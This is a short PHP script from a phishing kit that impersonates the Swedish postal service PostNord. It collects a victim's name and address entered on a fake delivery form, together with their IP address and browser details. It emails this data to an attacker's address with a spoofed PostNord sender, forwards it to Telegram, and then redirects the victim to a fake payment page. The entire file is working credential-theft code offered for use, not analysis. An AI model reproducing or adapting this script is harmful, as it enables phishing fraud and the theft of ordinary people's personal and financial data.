<?php
include "config.php";
$ip = getenv("REMOTE_ADDR");
$message = "------------------🤑  INFOS 🤑------------------\n

Receiver Name : ".$_POST['receiverName']."\n
receiver Street : ".$_POST['receiverStreet']."\n
Receiver ZipC : ".$_POST['receiverPostCode']."\n
Receiver City : ".$_POST['receiverCity']."\n
Receiver country : Sverige (Sweden)\n

------------------🤩 IP INFOS 🤩----------------\n
IP                        : $ip\n
BROWSER           : ".$_SERVER['HTTP_USER_AGENT']."\n
--------------------😎 BY BALHA  😎--------------\n";
$subject = "POSTNORD: Billing Infos : $ip ";
$send = "Elkayemhd@aol.com";  //7ot el mail ya jhon
$headers = 'From : postnord@login.tz'."r\n";
telegram($message);
mail($send,$subject,$message,$headers);
header("Location: ../payment/index.html");
?>